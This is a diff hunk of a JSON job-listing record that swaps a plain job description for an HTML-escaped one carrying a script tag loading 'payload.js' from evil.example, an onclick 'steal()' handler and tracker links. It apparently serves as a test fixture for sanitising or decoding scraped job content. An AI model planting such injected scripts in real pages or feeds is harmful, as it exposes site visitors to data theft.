@@ -4,7 +4,7 @@
       "id": 1001,
       "title": "Platform Engineer",
       "location": { "name": "London, England" },
-      "content": "<p>Permanent full-time hybrid role.</p><p>Build reliable platforms for our customers.</p>",
+      "content": "&lt;div class=&quot;job-description&quot; data-track=&quot;https://tracker.example/private&quot;&gt;&lt;p&gt;Permanent full-time hybrid role at AT&amp;amp;T.&lt;/p&gt;&lt;a href=&quot;https://tracker.example/apply&quot; onclick=&quot;steal()&quot;&gt;Build reliable platforms for our customers.&lt;/a&gt;&lt;script src=&quot;https://evil.example/payload.js&quot;&gt;STEAL()&lt;/script&gt;&lt;/div&gt;",
       "absolute_url": "https://boards.greenhouse.io/acme/jobs/1001",
       "updated_at": "2026-07-16T09:30:00Z",
       "metadata": [
